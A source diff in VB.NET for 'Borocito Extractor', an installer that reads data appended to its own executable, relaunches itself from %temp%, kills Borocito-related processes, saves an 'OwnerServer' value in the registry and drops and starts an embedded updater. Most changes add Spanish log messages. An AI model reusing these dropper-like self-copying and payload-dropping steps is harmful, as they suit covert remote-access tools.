@@ -31,6 +31,7 @@ Module Memory
     Public OwnerServer As String = Nothing
     Sub LoadInject()
         Try
+            AddToLog("LoadInject@Memory", "Cargando datos inyectados...", False)
             FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
             Dim stubb As String = Space(LOF(1))
             Dim FileSplit = "|BRO|"
@@ -45,6 +46,7 @@ Module Memory
     End Sub
     Sub PutInject()
         Try
+            AddToLog("PutInject@Memory", "Inyectando...", False)
             If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoExtractor.exe") Then
                 My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoExtractor.exe")
             End If
@@ -87,13 +89,19 @@ Module StartUp
     Sub RunFromLocation()
         Try
             If Application.StartupPath.Contains("Local\Temp") = False Then
+                AddToLog("RunFromLocation@StartUp", "No se esta ejecutando desde %temp%, reejecutando...", False)
                 If My.Computer.FileSystem.FileExists(DIRTemp & "\BoroExtractor.exe") Then
                     My.Computer.FileSystem.DeleteFile(DIRTemp & "\BoroExtractor.exe")
                 End If
                 My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRTemp & "\BoroExtractor.exe")
-                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\BorocitoExtractor.exe")
                 Process.Start(DIRTemp & "\BoroExtractor.exe", parameters)
                 End
+            Else
+                AddToLog("RunFromLocation@StartUp", "Se esta ejecutando desde %temp%", False)
+                If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoExtractor.exe") Then
+                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoExtractor.exe")
+                End If
+                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\BorocitoExtractor.exe")
             End If
         Catch ex As Exception
             AddToLog("RunFromLocation@StartUp", "Error: " & ex.Message, True)
@@ -112,10 +120,12 @@ Module StartUp
         Try
             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
             If regKey Is Nothing Then
+                AddToLog("CheckIfExist@StartUp", "Guardando valores en el registro...", False)
                 Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito")
                 regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
                 regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
             Else
+                AddToLog("CheckIfExist@StartUp", "Leyendo valores del registro...", False)
                 OwnerServer = regKey.GetValue("OwnerServer")
             End If
         Catch ex As Exception
@@ -124,14 +134,19 @@ Module StartUp
     End Sub
     Sub StartExtract()
         Try
+            AddToLog("StartExtract@StartUp", "Inicializando Extractor...", False)
             Try
                 Dim Borocito As Process() = Process.GetProcessesByName("Borocito")
                 If Borocito.Length >= 1 Then
                     Borocito(0).Kill()
                 End If
                 Dim Updater As Process() = Process.GetProcessesByName("BorocitoUpdater")
-                If Updater.Length = 1 Then
+                If Updater.Length >= 1 Then
                     Updater(0).Kill()
+                End If
+                Dim Updater2 As Process() = Process.GetProcessesByName("BoroUpdater")
+                If Updater2.Length >= 1 Then
+                    Updater2(0).Kill()
                 End If
             Catch
             End Try
@@ -142,13 +157,14 @@ Module StartUp
             If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoUpdater.exe") Then
                 My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoUpdater.exe")
             End If
-            My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\BorocitoUpdater.exe", My.Resources.Updater, False)
+            My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\BorocitoUpdater.exe", My.Resources.BorocitoUpdater, False)
         Catch ex As Exception
             AddToLog("StartExtract@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub InitUpdater()
         Try
+            AddToLog("InitUpdater@StartUp", "Iniciando Updater...", False)
             Process.Start(DIRCommons & "\BorocitoUpdater.exe")
             End
         Catch ex As Exception
